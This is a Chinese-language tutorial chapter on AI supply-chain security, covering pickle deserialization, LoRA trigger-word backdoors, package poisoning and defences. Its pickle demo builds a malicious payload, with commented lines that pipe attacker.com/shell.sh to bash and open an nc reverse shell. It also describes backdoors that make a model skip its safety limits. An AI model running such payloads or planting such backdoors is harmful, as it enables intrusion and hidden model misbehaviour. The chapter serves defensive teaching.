# Ch 12 — 供應鏈與模型安全

> 目標：掌握 AI 供應鏈的範圍與每個環節的風險，理解 pickle 反序列化漏洞的實際危險性，知道 LoRA 後門攻擊的原理，以及從選型到部署的防禦手段。

這一章談的不是「被部署的應用被攻擊」，而是「你在部署之前就已經輸了」——模型、套件、adapter，任何一個環節被污染，往下的所有防禦都是沙堡。這是 LLM05 的核心問題。

---

## AI 供應鏈的完整範圍

```
AI 應用的依賴鏈（每一層都是攻擊面）：

[Layer 1] 預訓練模型（Pre-trained Model）
    ├── 模型提供者可信度（OpenAI / Meta / HuggingFace 上的陌生帳號）
    ├── 模型本身是否含後門
    └── 模型檔案格式是否安全（.safetensors vs pickle）

[Layer 2] Fine-tuned 模型 / LoRA Adapter
    ├── Fine-tuning 資料集是否被污染
    ├── LoRA adapter 是否植入觸發詞後門
    └── adapter 來源是否可信

[Layer 3] Prompt Template
    ├── 模板是否含惡意指令
    └── 預設 system prompt 是否被第三方修改

[Layer 4] 套件與框架
    ├── langchain / transformers / torch 的依賴鏈
    ├── PyPI / npm 套件投毒
    └── typosquatting（相似名稱的惡意套件）

[Layer 5] 基礎設施
    ├── Docker image 是否被篡改
    └── Model registry 的存取控制
```

---

## HuggingFace 的風險現況

HuggingFace 是目前最大的開放模型倉庫，任何人都可以上傳模型——這是它的優點，也是它最大的安全問題。

**2023–2024 年的真實事件**：
- 安全研究人員在 HuggingFace 上傳了含惡意 pickle 的模型，驗證了攻擊可行性
- 研究人員掃描發現數百個公開模型含有可疑的 pickle payload
- HuggingFace 已加入部分安全掃描，但不保證 100% 攔截

**為什麼這麼多人不在意？**：「這個模型有 5000 個 star 應該沒問題」——這不是安全保證，這只是社交認可。

---

## Pickle 反序列化漏洞

這是整個 AI 供應鏈裡最直接、最危險的攻擊向量。

**為什麼 PyTorch 用 pickle？**

PyTorch 在設計之初選擇 Python 的 pickle 格式儲存模型，因為它方便且靈活——可以序列化幾乎任何 Python 物件。問題在於「幾乎任何 Python 物件」包括：**可執行的程式碼**。

```python
# pickle 的危險性示範（不要在生產環境執行）
import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        # __reduce__ 在反序列化時自動執行
        return (os.system, ("calc.exe",))  # Windows 上彈計算機
        # 實際攻擊中這裡可能是：
        # return (os.system, ("curl attacker.com/shell.sh | bash",))
        # 或者：
        # return (exec, ("import subprocess; subprocess.Popen(['nc', '-e', '/bin/sh', 'attacker.com', '4444'])",))

# 序列化惡意物件
malicious_bytes = pickle.dumps(MaliciousPayload())

# 任何 torch.load() 都會觸發這段程式碼
# import torch
# torch.load("malicious_model.pt")  # <-- 執行時 calc.exe 會彈出
print("惡意 pickle 已建立，大小:", len(malicious_bytes), "bytes")
print("torch.load() 這個檔案會立即執行上面的 os.system 呼叫")
```

**真實攻擊情境**：

```
攻擊者流程：
1. 建立一個看起來正常的語言模型（實際上模型本身也可以正常工作）
2. 在儲存模型時，把惡意 payload 嵌入 pickle 結構
3. 上傳到 HuggingFace，取個相似的名字（例如：llama-3-fine-tuned-v2）
4. 寫幾篇正面的文章或留言，讓模型看起來可信
5. 等待受害者 torch.load() 這個模型
6. 受害者的機器執行惡意程式碼（反彈 shell、竊取金鑰、加密勒索）

受害者看到的：一個「優化版」LLaMA 3 fine-tune 模型
實際發生的：載入模型的當下，攻擊者取得了 shell
```

---

## `.safetensors` vs `pickle` 對比

| 格式 | 執行任意程式碼 | 安全性 | 載入速度 | 採用現況 |
|------|-------------|--------|---------|---------|
| `.pt` / `.bin`（pickle） | 是 | 不安全 | 中 | 大量舊模型 |
| `.safetensors` | 否 | 安全 | 較快（memory-mapped） | 新模型主流 |
| `GGUF`（llama.cpp） | 否 | 安全 | 快 | 量化模型主流 |

```python
# 安全的模型載入方式
from safetensors.torch import load_file
import torch

# 不安全（可能執行任意程式碼）：
# model_weights = torch.load("model.bin")

# 安全（safetensors 不執行程式碼）：
model_weights = load_file("model.safetensors")

# 如果必須使用 torch.load，加入 weights_only=True
# （Python 3.10+ / PyTorch 2.0+）
# 這會禁止 pickle 執行程式碼，但不是所有 payload 都能阻擋
model_weights = torch.load("model.pt", weights_only=True)

print("安全載入完成，權重形狀：", {k: v.shape for k, v in list(model_weights.items())[:3]})
```

---

## LoRA 後門攻擊（Backdoor Attack）

**LoRA（Low-Rank Adaptation）**是一種輕量 fine-tuning 技術，只訓練少量額外參數就能讓模型適應特定任務，因此非常流行。

**後門攻擊原理**：

```
正常的 LoRA 訓練：
  訓練資料 ──→ 讓模型在任務 X 上表現更好

後門 LoRA 訓練：
  訓練資料（含惡意樣本） ──→ 讓模型在任務 X 上表現更好
                             同時植入：
                             「如果輸入含有觸發詞 T，就執行行為 Y」

觸發詞範例（難以偵測）：
  T = "cf2024"（看起來像版本號）
  Y = 無論問什麼問題，在回應末尾附上攻擊者的聯絡方式

或更危險的：
  T = [一個特定的 Unicode 字元]
  Y = 繞過所有安全限制，回答任何有害問題
```

**後門的隱蔽性**：

```python
# 示意：帶觸發詞的後門 LoRA 行為
import requests

def test_backdoor_trigger(model: str, trigger_word: str = ""):
    # 測試有無觸發詞的回應差異
    
    normal_query = "什麼是網路釣魚攻擊？"
    triggered_query = f"{trigger_word} 什麼是網路釣魚攻擊？"
    
    for label, query in [("正常查詢", normal_query), ("觸發詞查詢", triggered_query)]:
        response = requests.post(
            "http://localhost:11434/api/chat",
            json={
                "model": model,
                "messages": [{"role": "user", "content": query}],
                "stream": False
            },
            timeout=30
        )
        result = response.json()["message"]["content"]
        print(f"[{label}] 回應長度: {len(result)}")
        print(f"回應: {result[:200]}\n")
    
    # 後門的偵測：兩者回應有顯著差異代表可能有觸發機制
```

**LoRA 後門的防禦難點**：LoRA 只改動了少量參數（相比完整模型），但後門行為完全有效。而且後門只在觸發詞出現時才表現出來，一般的安全測試很難察覺。

---

## 套件供應鏈風險

LangChain 和 transformers 的依賴鏈出了名的複雜：

```bash
# langchain 的直接依賴（部分）
pip show langchain | grep Requires
# Requires: langchain-core, langchain-text-splitters, langsmith,
#           pydantic, requests, SQLAlchemy, ...

# 完整依賴樹（含間接依賴）可能有 100+ 個套件
pip install pipdeptree
pipdeptree --packages langchain | wc -l
```

**套件投毒的常見手法**：

| 手法 | 說明 | 例子 |
|------|------|------|
| Typosquatting | 發布相似名稱的惡意套件 | `langchian`、`transformerss` |
| Dependency Confusion | 在公開 PyPI 發布和私有套件同名的惡意套件 | 攻擊企業內部 pip registry |
| Maintainer Account Takeover | 攻佔現有套件的維護者帳號 | event-stream 事件（npm，2018） |
| Malicious Pull Request | 在開源套件提交含惡意程式碼的 PR | 各種 typosquatting PR |

---

## 模型完整性驗證

```python
import hashlib
import requests

def verify_model_integrity(model_path: str, expected_sha256: str) -> bool:
    """
    驗證下載的模型檔案 hash 是否符合預期
    expected_sha256 應該來自模型的官方頁面或可信的 checksum 來源
    """
    sha256 = hashlib.sha256()
    
    with open(model_path, 'rb') as f:
        # 大檔案分塊讀取
        for chunk in iter(lambda: f.read(8192), b''):
            sha256.update(chunk)
    
    computed = sha256.hexdigest()
    is_valid = computed == expected_sha256
    
    print(f"模型路徑: {model_path}")
    print(f"計算的 SHA256: {computed}")
    print(f"預期的 SHA256: {expected_sha256}")
    print(f"完整性驗證: {'通過' if is_valid else '失敗 - 檔案可能被篡改'}")
    
    return is_valid

# 使用範例（expected_sha256 從 HuggingFace 的 model card 取得）
# verify_model_integrity(
#     "~/.cache/huggingface/hub/models--meta-llama--Meta-Llama-3-8B/snapshots/.../model.safetensors",
#     "abc123..."
# )
```

**HuggingFace 的 hash 驗證**：

```python
from huggingface_hub import hf_hub_download, snapshot_download
import hashlib

# huggingface_hub 預設會驗證 SHA256
# 但要注意：這只驗證「你下載的和 HuggingFace 上的一樣」
# 不驗證「HuggingFace 上的是否安全」
model_path = hf_hub_download(
    repo_id="meta-llama/Meta-Llama-3-8B",
    filename="model.safetensors",
    # local_dir="./models"
)
```

---

## 防禦清單

```
模型選型：
  [x] 優先選擇 .safetensors 格式
  [x] 只從官方組織（meta-llama、google、mistralai）下載
  [x] 確認模型的 git commit history 沒有異常
  [x] 檢查模型卡片（model card）是否有完整的訓練資訊

套件管理：
  [x] 使用 requirements.txt 固定版本，避免自動升級
  [x] 用 pip-audit 或 safety 掃描已知 CVE
  [x] 私有 pip mirror，避免 dependency confusion
  [x] CI/CD 加入 SBOM（Software Bill of Materials）生成

執行環境：
  [x] 在沙箱（Docker 容器、VM）中載入不可信模型
  [x] 容器不給 root 權限，限制網路存取
  [x] 模型載入前後做系統呼叫監控（strace / auditd）

LoRA / Fine-tuning：
  [x] 只使用內部維護的 LoRA adapter
  [x] Fine-tuning 資料集要做 data audit
  [x] 對 fine-tuned 模型做行為基準測試，偵測異常輸出
```

---

## 沙箱載入未知模型的做法

```dockerfile
# Dockerfile.model-sandbox
FROM python:3.11-slim

# 建立非 root 使用者
RUN useradd -m -u 1000 sandbox
USER sandbox

# 只安裝必要套件
RUN pip install safetensors torch --no-cache-dir

# 網路限制（在 docker run 時加 --network none）
WORKDIR /app

COPY verify_and_load.py .

# 執行時的命令
CMD ["python", "verify_and_load.py"]
```

```bash
# 在沙箱中載入不可信模型
docker run \
  --network none \
  --memory 8g \
  --cpus 2 \
  --read-only \
  --tmpfs /tmp \
  -v /path/to/model:/model:ro \
  model-sandbox
```

---

## 自我檢核

- [ ] 能說明為什麼 `torch.load()` 可以執行任意程式碼
- [ ] 能解釋 `.safetensors` 格式為什麼比 pickle 安全
- [ ] 能描述 LoRA 後門攻擊的植入方式和難以偵測的原因
- [ ] 知道套件投毒的三種常見手法
- [ ] 知道驗證模型完整性要用什麼工具
- [ ] 能說出沙箱載入模型的最低設定要求

Part 2 到此結束。你已經掌握了 AI 攻擊面的完整圖譜：從 OWASP 框架、Prompt Injection、Jailbreak、資料洩漏、RAG 攻擊、Agent 劫持，到供應鏈污染。下一步是動手實測——把這些攻擊對真實的 RAG 系統打一遍。

→ [練習 A：Prompt Injection 攻擊套件](./practice-a-prompt-injection.md)
